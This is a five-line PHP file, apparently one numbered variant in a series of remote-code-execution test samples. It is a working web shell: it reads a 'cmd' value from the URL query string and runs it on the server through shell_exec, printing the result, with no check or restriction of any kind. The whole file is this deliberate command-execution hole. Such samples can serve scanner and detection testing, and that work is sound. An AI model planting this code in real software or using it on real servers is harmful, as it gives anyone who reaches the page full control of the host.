<?php
// RCE test variation #1309
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>